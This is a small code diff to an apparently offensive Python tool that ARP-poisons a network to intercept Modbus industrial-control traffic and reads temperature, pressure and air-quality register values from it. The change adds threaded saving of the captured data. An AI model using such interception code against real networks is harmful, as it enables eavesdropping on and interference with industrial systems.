@@ -230,6 +230,10 @@ def send_arp_poison(target_ip, target_mac, gateway_ip, attacker_mac, iface):
     send(packet, iface=iface, verbose=False)
     print(f"[INFO] ARP: {gateway_ip} ({attacker_mac}) -> {target_ip} ({target_mac})")
 
+
+def save_data_in_thread(b1, b2, b3):
+    """启动新线程保存数据"""
+    threading.Thread(target=print_data, args=(b1, b2, b3)).start()
 def parse_modbus_data(packet, sport, dport):
     """
     """
@@ -275,6 +279,7 @@ def parse_modbus_data(packet, sport, dport):
                     # 打印寄存器的值
                     #print(f"wendu（K）: {b1}, yali(MN): {b2}, kongqizhiliang: {b3}")
                     #print_data(b1, b2, b3)  # 保存到数据库
+                    save_data_in_thread(bb1, bb2, bb3)
                     # 从数据库中获取数据温度，
                     #xb1, xb2, xb3, loag = read_data()
                     if loag == 1:
